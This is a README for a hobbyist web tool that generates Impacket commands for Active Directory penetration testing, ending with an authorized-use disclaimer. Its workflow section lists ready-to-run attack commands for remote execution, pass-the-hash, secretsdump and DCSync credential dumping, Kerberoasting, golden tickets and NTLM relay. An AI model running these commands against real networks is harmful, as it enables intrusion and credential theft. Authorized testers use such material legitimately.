# ♥ Panko's Impacket Command Generator ♥

A cute little web-based tool for generating impacket commands for Active Directory pentesting! 💜

Based on [Impacket](https://github.com/fortra/impacket) by Fortra - a collection of Python classes for working with network protocols.

---

## 🎨 Features

- 🔧 **70+ Impacket Commands** - Covering all major tools
- 📝 **Dynamic Command Generation** - Fill in parameters, get commands
- 🎯 **Smart Filtering** - Filter by category (execution, kerberos, credentials, etc.)
- 🔍 **Search** - Find commands by name, description, or tags
- 💜 **Pink/Cute Theme** - Matching cyberspace aesthetic
- 🌙 **Dark Mode** - Toggle between light and dark themes
- 📋 **Copy to Clipboard** - One-click copy for commands
- 💾 **Copy All** - Export all filtered commands at once

---

## 📁 What's Included

### Command Categories

#### 🔐 Remote Execution
- `psexec.py` - Execute commands via SMB
- `smbexec.py` - SMB execution without binary upload
- `wmiexec.py` - Execution via WMI
- `dcomexec.py` - Execution via DCOM
- `atexec.py` - Execution via Task Scheduler

#### 💎 Credential Dumping
- `secretsdump.py` - Dump SAM, LSA secrets, NTDS.dit
- DCSync attacks
- Local and remote credential extraction

#### 🎫 Kerberos Attacks
- `GetNPUsers.py` - ASREPRoast
- `GetUserSPNs.py` - Kerberoast
- `getTGT.py` - Request TGT tickets
- `getST.py` - Service ticket requests
- `ticketer.py` - Golden & Silver ticket creation

#### 📂 SMB Operations
- `smbclient.py` - Interactive SMB client
- `smbserver.py` - SMB server for file transfers
- `lookupsid.py` - SID enumeration
- `reg.py` - Remote registry access
- `services.py` - Remote service management

#### 🌐 LDAP / Active Directory
- `GetADUsers.py` - User enumeration
- `addcomputer.py` - Add computer accounts
- `rbcd.py` - Resource-Based Constrained Delegation

#### 🔄 Relay Attacks
- `ntlmrelayx.py` - NTLM relay attacks
- SMB, LDAP, HTTP relay
- SOCKS proxy mode

#### 🗄️ MSSQL
- `mssqlclient.py` - Interactive MSSQL client
- Command execution via xp_cmdshell

#### 📊 Enumeration & Misc
- `findDelegation.py` - Find delegation accounts
- `rpcdump.py` - RPC endpoint enumeration
- `samrdump.py` - SAMR enumeration
- `netview.py` - Network enumeration
- And many more!

---

## 🚀 Usage

### Quick Start

1. **Open in Browser:**
```bash
cd /home/kali/impacket-generator
python3 -m http.server 8000
# Open: http://localhost:8000
```

2. **Configure Parameters:**
   - Fill in your target IP, credentials, domain info
   - Leave fields empty to see parameter placeholders

3. **Filter & Search:**
   - Click category buttons to filter commands
   - Use search bar to find specific tools

4. **Copy Commands:**
   - Click "copy" on individual commands
   - Click "copy all" to get all filtered commands

### Parameter Inputs

The tool provides inputs for all common parameters:

**Authentication:**
- Domain
- Username
- Password
- NTLM hash (for Pass-the-Hash)
- AES key (for Overpass-the-Hash)

**Targets:**
- Target IP/hostname
- Domain Controller IP

**Kerberos:**
- SPN (Service Principal Name)
- KRBTGT hash (Golden Ticket)
- Domain SID
- Service hash (Silver Ticket)

**Commands & Users:**
- Command to execute
- Target user accounts

**SMB & File Sharing:**
- Share name
- Local path

**Computer Accounts:**
- Computer name
- Computer password

**And more!**

---

## 📖 Impacket Tool Reference

### Installation

```bash
# Install impacket
pip3 install impacket

# Or from source
git clone https://github.com/fortra/impacket.git
cd impacket
pip3 install .
```

### Common Workflows

#### 1. Remote Execution

```bash
# Password authentication
psexec.py CORP/administrator:Password123!@192.168.1.10

# Pass-the-Hash
psexec.py -hashes :NTLMHASH CORP/administrator@192.168.1.10

# Via WMI (stealthier)
wmiexec.py CORP/administrator:Password123!@192.168.1.10
```

#### 2. Credential Dumping

```bash
# Dump everything remotely
secretsdump.py CORP/administrator:Password123!@192.168.1.10

# DCSync (requires replication rights)
secretsdump.py -just-dc-ntlm CORP/administrator:Password123!@192.168.1.5

# From local files
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL
```

#### 3. Kerberos Attacks

```bash
# ASREPRoast (users without pre-auth)
GetNPUsers.py CORP/ -usersfile users.txt -format hashcat

# Kerberoast (request service tickets)
GetUserSPNs.py CORP/user:password -dc-ip 192.168.1.5 -request

# Request TGT
getTGT.py CORP/administrator:Password123!

# Golden Ticket
ticketer.py -nthash KRBTGTHASH -domain-sid SID -domain CORP administrator
```

#### 4. Relay Attacks

```bash
# SMB relay
ntlmrelayx.py -tf targets.txt -smb2support

# Relay to LDAP (privilege escalation)
ntlmrelayx.py -t ldap://192.168.1.5 --escalate-user attacker

# SOCKS proxy mode
ntlmrelayx.py -tf targets.txt -socks
```

---

## 🎨 Customization

### Theme Colors

Edit `css/style.css`:

```css
:root {
    --primary: #e942f5;      /* Main pink */
    --primary-dark: #b32db3;  /* Dark pink */
    --text: #cb16ff;          /* Purple text */
    --bg-pink: #ffe6f7;       /* Background */
}
```

### Add More Commands

Edit `js/data.js`:

```javascript
{
    name: "newtool.py",
    command: "newtool.py {domain}/{username}:{password}@{target}",
    meta: ["category", "subcategory"],
    description: "Description of what it does",
    params: ["domain", "username", "password", "target"]
}
```

---

## 🌐 Deployment

### Local Testing

```bash
python3 -m http.server 8000
```

### Production with Docker

```bash
# Create Dockerfile
cat > Dockerfile << 'EOF'
FROM nginx:alpine
COPY . /usr/share/nginx/html
EXPOSE 80
EOF

# Build and run
docker build -t impacket-generator .
docker run -d -p 80:80 impacket-generator
```

### With Caddy (Automatic HTTPS)

See the `file-exfiltration-generator` project for a complete Docker Compose + Caddy setup that can be adapted for this project.

---

## ⚠️ Disclaimer

**FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING ONLY!**

- Only use on systems you own or have explicit permission to test
- Unauthorized access to computer systems is illegal
- Always follow responsible disclosure practices
- Respect privacy and data protection laws

This tool is for:
- ✅ Authorized penetration testing
- ✅ Red team exercises
- ✅ Security research
- ✅ CTF competitions
- ✅ Learning Active Directory security

NOT for:
- ❌ Unauthorized access
- ❌ Malicious activities
- ❌ Illegal hacking
- ❌ Privacy violations

---

## 📚 Resources

### Impacket
- **GitHub:** https://github.com/fortra/impacket
- **Documentation:** https://www.secureauth.com/labs/open-source-tools/impacket/
- **Examples:** https://github.com/fortra/impacket/tree/master/examples

### Active Directory Security
- **HackTricks:** https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
- **PayloadsAllTheThings:** https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md
- **Pentester Academy:** Active Directory courses

### Offensive Security
- **CRTP:** Certified Red Team Professional
- **CRTE:** Certified Red Team Expert
- **OSCP:** Offensive Security Certified Professional

---

## 🔗 Links

- **Panko's Website:** https://panekopanko.se
- **GitHub:** https://github.com/panekopanko
- **Twitter:** @panekopanko

---

## 🙏 Credits

- **Impacket** by Fortra - The amazing tool collection
- **Reverse Shell Generator** by 0dayCTF - Inspiration for the UI

---

**made with love by panko** ♥

**happy hacking!** 💜✨
